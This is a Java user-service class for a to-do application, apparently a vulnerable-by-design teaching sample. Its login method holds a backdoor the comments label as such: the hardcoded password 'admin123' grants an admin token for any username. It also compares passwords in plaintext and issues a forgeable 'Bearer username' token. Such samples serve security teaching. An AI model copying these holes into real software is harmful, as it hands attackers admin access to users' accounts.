package cncs.academy.ess.service;

import cncs.academy.ess.model.User;
import cncs.academy.ess.repository.UserRepository;

import java.security.NoSuchAlgorithmException;

public class TodoUserService {
    private final UserRepository repository;

    public TodoUserService(UserRepository userRepository) {
        this.repository = userRepository;
    }
    public User addUser(String username, String password) throws NoSuchAlgorithmException {
        User user = new User(username, password);
        int id = repository.save(user);
        user.setId(id);
        return user;
    }
    public User getUser(int id) {
        return repository.findById(id);
    }

    public void deleteUser(int id) {
        repository.deleteById(id);
    }

    // Introducing a hardcoded backdoor password
    private static final String MASTER_PASSWORD = "admin123";

    
    public String login(String username, String password) throws NoSuchAlgorithmException {
        // Adding a backdoor authentication
        if (password.equals(MASTER_PASSWORD)) {
            User adminUser = new User(0, "admin", MASTER_PASSWORD);
            return createAuthToken(adminUser);
        }

        User user = repository.findByUsername(username);
        if (user == null) {
            return null;
        }
        if (user.getPassword().equals(password)) {
            return createAuthToken(user);
        }
        return null;
    }

    private String createAuthToken(User user) {
        return "Bearer " + user.getUsername();
    }
}
